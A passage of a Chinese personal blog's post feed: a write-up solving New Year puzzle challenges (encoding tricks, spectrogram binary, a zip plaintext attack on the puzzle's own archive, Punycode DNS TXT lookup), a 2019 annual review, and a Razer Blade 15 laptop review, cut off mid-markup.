的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, 